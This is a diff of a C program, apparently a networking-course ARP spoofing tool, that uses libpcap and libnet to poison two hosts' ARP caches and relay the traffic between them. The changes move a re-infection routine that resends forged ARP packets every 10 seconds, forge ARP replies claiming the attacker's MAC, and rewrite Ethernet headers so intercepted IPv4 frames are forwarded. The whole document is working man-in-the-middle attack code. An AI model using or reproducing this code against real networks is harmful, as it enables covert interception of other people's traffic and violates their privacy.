@@ -17,7 +17,7 @@ int main(int argc, char *argv[])
     // open a handle of interface
     char *interface = argv[1];
     char err_msg[PCAP_ERRBUF_SIZE];
-    pcap_t *interface_handle = pcap_open_live(interface, 0xFFFF, 1, 1, err_msg);
+    pcap_t *interface_handle = pcap_open_live(interface, 0xFFFF, 0, 1, err_msg);
     if( interface_handle == NULL ) {
         fprintf(stderr, "[!] Can't open interface (%s)\n", interface);
         fprintf(stderr, "\tmsg: %s\n", err_msg);
@@ -87,6 +87,15 @@ int main(int argc, char *argv[])
     send_arp(interface_handle, my_mac, sender_ip, target_mac, target_ip, ARPOP_REQUEST);
     send_arp(interface_handle, my_mac, target_ip, sender_mac, sender_ip, ARPOP_REQUEST);
     while( 1 ) {
+
+        // send arp infect packet every 10 seconds.
+        time_t now = time(0);
+        if( now - before > 10 ) {
+            send_arp(interface_handle, my_mac, sender_ip, target_mac, target_ip, ARPOP_REQUEST);
+            send_arp(interface_handle, my_mac, target_ip, sender_mac, sender_ip, ARPOP_REQUEST);
+            before = now;
+        }
+
         struct pcap_pkthdr *rcv_header;
         const u_char *rcv_frame;
 
@@ -103,7 +112,7 @@ int main(int argc, char *argv[])
         // timeout.
         else if( result_capturing == 0 )
         {
-            continue;
+            // DO NOT ANYTHING
         }
 
         // success to capture a packet without problems.
@@ -112,69 +121,60 @@ int main(int argc, char *argv[])
             struct libnet_ethernet_hdr *rcv_eth_hdr = (struct libnet_ethernet_hdr *)(&rcv_frame[0]);
 
             // check that upper protocol is arp.
-            if( IS_ARP(rcv_frame) ) {
-                struct libnet_arp_hdr *rcv_arp_hdr = (struct libnet_arp_hdr *)(&rcv_frame[sizeof(struct libnet_ethernet_hdr)]);
-                if( ntohs(rcv_arp_hdr->ar_op) != ARPOP_REQUEST ) continue;
+            if( IS_ARP(rcv_frame) && ntohs(((struct libnet_arp_hdr *)(&rcv_frame[sizeof(struct libnet_ethernet_hdr)]))->ar_op) == ARPOP_REQUEST ) {
+                //struct libnet_arp_hdr *rcv_arp_hdr = (struct libnet_arp_hdr *)(&rcv_frame[sizeof(struct libnet_ethernet_hdr)]);
 
                 struct arp_body *rcv_payload = (struct arp_body *)(&rcv_frame[sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr)]);
-                uint32_t sip = *((uint32_t *)rcv_payload->sip);
-                uint32_t dip = *((uint32_t *)rcv_payload->dip);
+                uint32_t snd_ip = *((uint32_t *)rcv_payload->snd_ip);
+                uint32_t tgt_ip = *((uint32_t *)rcv_payload->tgt_ip);
 
                 uint8_t *remote_mac;
 
                 // reply to target that i'm a sender.
-                if( sip == target_ip && dip == sender_ip ) {
+                if( snd_ip == target_ip && tgt_ip == sender_ip ) {
                     remote_mac = target_mac;
                 }
                 // reply to sender that i'm a target.
-                else if( sip == sender_ip && dip == target_ip ) {
+                else if( snd_ip == sender_ip && tgt_ip == target_ip ) {
                     remote_mac = sender_mac;
                 }
                 else {
                     continue;
                 }
 
-                sleep(1);
-                send_arp(interface_handle, my_mac, dip, remote_mac, sip, ARPOP_REPLY);
-                printf("[+] Send ARP reply to %s\n", inet_ntoa(*((struct in_addr *)(&sip))));
+                sleep(1); // if sender sent arp brocast request, to sleep I will overwrite it's arp table
+                send_arp(interface_handle, my_mac, tgt_ip, remote_mac, snd_ip, ARPOP_REPLY);
+                printf("[+] Send ARP reply to %s\n", inet_ntoa(*((struct in_addr *)(&snd_ip))));
             }
 
-            // if upper protocol is not arp, relay a packet.
+            // check that upper protocol is ipv4
             else if( IS_IPV4(rcv_frame) ) {
                 struct libnet_ipv4_hdr *ipv4_hdr = (struct libnet_ipv4_hdr *)&rcv_frame[sizeof(struct libnet_ethernet_hdr)];
 
-                uint32_t sip = ipv4_hdr->ip_src.s_addr;
-                uint32_t dip = ipv4_hdr->ip_dst.s_addr;
+                uint32_t src_ip = ipv4_hdr->ip_src.s_addr;
+                uint32_t dst_ip = ipv4_hdr->ip_dst.s_addr;
 
                 uint8_t *remote_mac;
 
                 // relay packet from sender to target.
-                if( sip == sender_ip && dip == target_ip ) {
+                if( src_ip == sender_ip && dst_ip == target_ip ) {
                     remote_mac = target_mac;
                 }
                 // relay packet from target to sender.
-                else if( sip == target_ip && dip == sender_ip ) {
+                else if( src_ip == target_ip && dst_ip == sender_ip ) {
                     remote_mac = sender_mac;
                 }
                 else {
                     continue;
                 }
 
-                memcpy((void *)rcv_frame, remote_mac, 6);
-                memcpy((void *)(rcv_frame+6), my_mac, 6);
+                memcpy((void *)rcv_eth_hdr->ether_dhost, remote_mac, 6);
+                memcpy((void *)rcv_eth_hdr->ether_shost, my_mac, 6);
 
                 pcap_sendpacket(interface_handle, rcv_frame, rcv_header->caplen);
             }
         }
-
-        // send infect arp packet every 10 seconds.
-        time_t now = time(0);
-        if( now - before > 10 ) {
-            send_arp(interface_handle, my_mac, sender_ip, target_mac, target_ip, ARPOP_REQUEST);
-            send_arp(interface_handle, my_mac, target_ip, sender_mac, sender_ip, ARPOP_REQUEST);
-            before = now;
-        }
-    }
+    } // end of while( 1 )
 
     pcap_close(interface_handle);
 
